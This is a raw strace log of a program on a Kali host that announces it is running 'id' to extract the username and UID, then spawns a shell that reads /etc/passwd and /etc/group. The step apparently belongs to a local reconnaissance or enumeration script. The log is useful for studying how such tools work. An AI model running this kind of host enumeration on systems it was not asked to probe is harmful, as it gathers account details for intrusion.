pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2055640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f34c1b5b000
mmap(0x7f34c1b83000, 1462272, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f34c1b83000
mmap(0x7f34c1ce8000, 352256, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0x7f34c1ce8000
mmap(0x7f34c1d3e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e2000) = 0x7f34c1d3e000
mmap(0x7f34c1d44000, 52696, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f34c1d44000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f34c1b58000
arch_prctl(ARCH_SET_FS, 0x7f34c1b58740) = 0
set_tid_address(0x7f34c1b58a10)         = 669326
set_robust_list(0x7f34c1b58a20, 24)     = 0
rseq(0x7f34c1b59060, 0x20, 0, 0x53053053) = 0
mprotect(0x7f34c1d3e000, 16384, PROT_READ) = 0
mprotect(0x55fe7570b000, 4096, PROT_READ) = 0
mprotect(0x7f34c1da5000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7f34c1d51000, 100562)          = 0
fstat(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0xd), ...}) = 0
getrandom("\x30\x3b\x03\x8c\xcf\xad\x72\x4c", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x55fe97aec000
brk(0x55fe97b0d000)                     = 0x55fe97b0d000
write(1, "[!] Running 'id' command to extr"..., 67[!] Running 'id' command to extract the username and user ID (UID)
) = 67
pipe2([3, 4], O_CLOEXEC)                = 0
prlimit64(0, RLIMIT_NOFILE, NULL, {rlim_cur=1024, rlim_max=1073741816}) = 0
prlimit64(0, RLIMIT_NOFILE, NULL, {rlim_cur=1024, rlim_max=1073741816}) = 0
mmap(NULL, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7f34c1d61000
rt_sigprocmask(SIG_BLOCK, ~[], [], 8)   = 0
clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x7f34c1d61000, stack_size=0x9000}, 88strace: Process 669327 attached
 <unfinished ...>
[pid 669327] rt_sigprocmask(SIG_BLOCK, NULL, ~[KILL STOP], 8) = 0
[pid 669327] dup2(4, 1)                 = 1
[pid 669327] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[pid 669327] execve("/bin/sh", ["sh", "-c", "--", "id"], 0x7fff91f73e78 /* 57 vars */ <unfinished ...>
[pid 669326] <... clone3 resumed>)      = 669327
[pid 669326] munmap(0x7f34c1d61000, 36864) = 0
[pid 669326] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
[pid 669326] close(4 <unfinished ...>
[pid 669327] <... execve resumed>)      = 0
[pid 669326] <... close resumed>)       = 0
[pid 669326] fcntl(3, F_SETFD, 0)       = 0
[pid 669326] fstat(3,  <unfinished ...>
[pid 669327] brk(NULL <unfinished ...>
[pid 669326] <... fstat resumed>{st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
[pid 669326] read(3,  <unfinished ...>
[pid 669327] <... brk resumed>)         = 0x558da0c4a000
[pid 669327] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcba8f9c000
[pid 669327] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
[pid 669327] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
[pid 669327] fstat(3, {st_mode=S_IFREG|0644, st_size=100562, ...}) = 0
[pid 669327] mmap(NULL, 100562, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcba8f83000
[pid 669327] close(3)                   = 0
[pid 669327] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
[pid 669327] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000\237\2\0\0\0\0\0"..., 832) = 832
[pid 669327] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
[pid 669327] fstat(3, {st_mode=S_IFREG|0755, st_size=2003408, ...}) = 0
[pid 669327] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
[pid 669327] mmap(NULL, 2055640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcba8d8d000
[pid 669327] mmap(0x7fcba8db5000, 1462272, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7fcba8db5000
[pid 669327] mmap(0x7fcba8f1a000, 352256, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0x7fcba8f1a000
[pid 669327] mmap(0x7fcba8f70000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e2000) = 0x7fcba8f70000
[pid 669327] mmap(0x7fcba8f76000, 52696, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fcba8f76000
[pid 669327] close(3)                   = 0
[pid 669327] mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcba8d8a000
[pid 669327] arch_prctl(ARCH_SET_FS, 0x7fcba8d8a740) = 0
[pid 669327] set_tid_address(0x7fcba8d8aa10) = 669327
[pid 669327] set_robust_list(0x7fcba8d8aa20, 24) = 0
[pid 669327] rseq(0x7fcba8d8b060, 0x20, 0, 0x53053053) = 0
[pid 669327] mprotect(0x7fcba8f70000, 16384, PROT_READ) = 0
[pid 669327] mprotect(0x558d810ec000, 8192, PROT_READ) = 0
[pid 669327] mprotect(0x7fcba8fd7000, 8192, PROT_READ) = 0
[pid 669327] prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
[pid 669327] munmap(0x7fcba8f83000, 100562) = 0
[pid 669327] getuid()                   = 1000
[pid 669327] getgid()                   = 1000
[pid 669327] getpid()                   = 669327
[pid 669327] rt_sigaction(SIGCHLD, {sa_handler=0x558d810e1550, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fcba8dccd20}, NULL, 8) = 0
[pid 669327] geteuid()                  = 1000
[pid 669327] getrandom("\x8f\x69\x68\x2f\xc6\x15\x2b\x2c", 8, GRND_NONBLOCK) = 8
[pid 669327] brk(NULL)                  = 0x558da0c4a000
[pid 669327] brk(0x558da0c6b000)        = 0x558da0c6b000
[pid 669327] getppid()                  = 669326
[pid 669327] newfstatat(AT_FDCWD, "/home/kali", {st_mode=S_IFDIR|0700, st_size=4096, ...}, 0) = 0
[pid 669327] newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0700, st_size=4096, ...}, 0) = 0
[pid 669327] geteuid()                  = 1000
[pid 669327] getegid()                  = 1000
[pid 669327] rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
[pid 669327] rt_sigaction(SIGINT, {sa_handler=0x558d810e1550, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fcba8dccd20}, NULL, 8) = 0
[pid 669327] rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
[pid 669327] rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fcba8dccd20}, NULL, 8) = 0
[pid 669327] rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
[pid 669327] rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fcba8dccd20}, NULL, 8) = 0
[pid 669327] newfstatat(AT_FDCWD, "/home/kali/.local/bin/id", 0x7fffa545d350, 0) = -1 ENOENT (No such file or directory)
[pid 669327] newfstatat(AT_FDCWD, "/usr/local/sbin/id", 0x7fffa545d350, 0) = -1 ENOENT (No such file or directory)
[pid 669327] newfstatat(AT_FDCWD, "/usr/sbin/id", 0x7fffa545d350, 0) = -1 ENOENT (No such file or directory)
[pid 669327] newfstatat(AT_FDCWD, "/sbin/id", 0x7fffa545d350, 0) = -1 ENOENT (No such file or directory)
[pid 669327] newfstatat(AT_FDCWD, "/usr/local/bin/id", 0x7fffa545d350, 0) = -1 ENOENT (No such file or directory)
[pid 669327] newfstatat(AT_FDCWD, "/usr/bin/id", {st_mode=S_IFREG|0755, st_size=52240, ...}, 0) = 0
[pid 669327] rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1], NULL, 8) = 0
[pid 669327] vfork(strace: Process 669328 attached
 <unfinished ...>
[pid 669328] rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
[pid 669328] execve("/usr/bin/id", ["id"], 0x558da0c4af28 /* 57 vars */ <unfinished ...>
[pid 669327] <... vfork resumed>)       = 669328
[pid 669327] rt_sigprocmask(SIG_SETMASK, [], ~[KILL STOP RTMIN RT_1], 8) = 0
[pid 669327] wait4(-1,  <unfinished ...>
[pid 669328] <... execve resumed>)      = 0
[pid 669328] brk(NULL)                  = 0x5582be414000
[pid 669328] mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7afd694000
[pid 669328] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
[pid 669328] openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=100562, ...}) = 0
[pid 669328] mmap(NULL, 100562, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f7afd67b000
[pid 669328] close(3)                   = 0
[pid 669328] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=186600, ...}) = 0
[pid 669328] mmap(NULL, 194256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f7afd64b000
[pid 669328] mmap(0x7f7afd652000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7000) = 0x7f7afd652000
[pid 669328] mmap(0x7f7afd66f000, 32768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x24000) = 0x7f7afd66f000
[pid 669328] mmap(0x7f7afd677000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2c000) = 0x7f7afd677000
[pid 669328] mmap(0x7f7afd679000, 5840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f7afd679000
[pid 669328] close(3)                   = 0
[pid 669328] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000\237\2\0\0\0\0\0"..., 832) = 832
[pid 669328] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
[pid 669328] fstat(3, {st_mode=S_IFREG|0755, st_size=2003408, ...}) = 0
[pid 669328] pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
[pid 669328] mmap(NULL, 2055640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f7afd455000
[pid 669328] mmap(0x7f7afd47d000, 1462272, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7f7afd47d000
[pid 669328] mmap(0x7f7afd5e2000, 352256, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0x7f7afd5e2000
[pid 669328] mmap(0x7f7afd638000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e2000) = 0x7f7afd638000
[pid 669328] mmap(0x7f7afd63e000, 52696, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f7afd63e000
[pid 669328] close(3)                   = 0
[pid 669328] openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=645768, ...}) = 0
[pid 669328] mmap(NULL, 643976, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f7afd3b7000
[pid 669328] mmap(0x7f7afd3b9000, 454656, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x7f7afd3b9000
[pid 669328] mmap(0x7f7afd428000, 176128, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x71000) = 0x7f7afd428000
[pid 669328] mmap(0x7f7afd453000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9c000) = 0x7f7afd453000
[pid 669328] close(3)                   = 0
[pid 669328] mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7afd3b4000
[pid 669328] arch_prctl(ARCH_SET_FS, 0x7f7afd3b4800) = 0
[pid 669328] set_tid_address(0x7f7afd3b4ad0) = 669328
[pid 669328] set_robust_list(0x7f7afd3b4ae0, 24) = 0
[pid 669328] rseq(0x7f7afd3b5120, 0x20, 0, 0x53053053) = 0
[pid 669328] mprotect(0x7f7afd638000, 16384, PROT_READ) = 0
[pid 669328] mprotect(0x7f7afd453000, 4096, PROT_READ) = 0
[pid 669328] mprotect(0x7f7afd677000, 4096, PROT_READ) = 0
[pid 669328] mprotect(0x5582a8d60000, 4096, PROT_READ) = 0
[pid 669328] mprotect(0x7f7afd6cf000, 8192, PROT_READ) = 0
[pid 669328] prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
[pid 669328] munmap(0x7f7afd67b000, 100562) = 0
[pid 669328] statfs("/sys/fs/selinux", 0x7fff1bd8d4a0) = -1 ENOENT (No such file or directory)
[pid 669328] statfs("/selinux", 0x7fff1bd8d4a0) = -1 ENOENT (No such file or directory)
[pid 669328] getrandom("\xf3\x7e\x2c\xff\x5f\x5f\xf9\x85", 8, GRND_NONBLOCK) = 8
[pid 669328] brk(NULL)                  = 0x5582be414000
[pid 669328] brk(0x5582be435000)        = 0x5582be435000
[pid 669328] openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
[pid 669328] read(3, "nodev\tsysfs\nnodev\ttmpfs\nnodev\tbd"..., 1024) = 379
[pid 669328] read(3, "", 1024)          = 0
[pid 669328] close(3)                   = 0
[pid 669328] access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
[pid 669328] openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=3055776, ...}) = 0
[pid 669328] mmap(NULL, 3055776, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f7afd000000
[pid 669328] close(3)                   = 0
[pid 669328] geteuid()                  = 1000
[pid 669328] getuid()                   = 1000
[pid 669328] getegid()                  = 1000
[pid 669328] getgid()                   = 1000
[pid 669328] openat(AT_FDCWD, "/usr/share/locale/locale.alias", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=2996, ...}) = 0
[pid 669328] read(3, "# Locale name alias data base.\n#"..., 4096) = 2996
[pid 669328] read(3, "", 4096)          = 0
[pid 669328] close(3)                   = 0
[pid 669328] openat(AT_FDCWD, "/usr/share/locale/en_US.UTF-8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 669328] openat(AT_FDCWD, "/usr/share/locale/en_US.utf8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 669328] openat(AT_FDCWD, "/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 669328] openat(AT_FDCWD, "/usr/share/locale/en.UTF-8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 669328] openat(AT_FDCWD, "/usr/share/locale/en.utf8/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 669328] openat(AT_FDCWD, "/usr/share/locale/en/LC_MESSAGES/coreutils.mo", O_RDONLY) = -1 ENOENT (No such file or directory)
[pid 669328] fstat(1, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
[pid 669328] socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3
[pid 669328] connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
[pid 669328] close(3)                   = 0
[pid 669328] socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3
[pid 669328] connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] newfstatat(AT_FDCWD, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=574, ...}) = 0
[pid 669328] read(3, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 574
[pid 669328] read(3, "", 4096)          = 0
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=574, ...}) = 0
[pid 669328] close(3)                   = 0
[pid 669328] openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=3396, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:0:root:/root:/usr/bin/z"..., 4096) = 3396
[pid 669328] close(3)                   = 0
[pid 669328] socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3
[pid 669328] connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
[pid 669328] close(3)                   = 0
[pid 669328] socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3
[pid 669328] connect(3, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] getgroups(0, NULL)         = 17
[pid 669328] getgroups(17, [4, 20, 24, 25, 27, 29, 30, 44, 46, 100, 101, 107, 115, 127, 135, 137, 1000]) = 17
[pid 669328] openat(AT_FDCWD, "/proc/sys/kernel/ngroups_max", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] read(3, "65536\n", 31)     = 6
[pid 669328] close(3)                   = 0
[pid 669328] openat(AT_FDCWD, "/proc/sys/kernel/ngroups_max", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] read(3, "65536\n", 31)     = 6
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
[pid 669328] close(3)                   = 0
[pid 669328] newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=574, ...}, 0) = 0
[pid 669328] openat(AT_FDCWD, "/etc/group", O_RDONLY|O_CLOEXEC) = 3
[pid 669328] fstat(3, {st_mode=S_IFREG|0644, st_size=1331, ...}) = 0
[pid 669328] lseek(3, 0, SEEK_SET)      = 0
[pid 669328] read(3, "root:x:0:\ndaemon:x:1:\nbin:x:2:\ns"..., 4096) = 1331
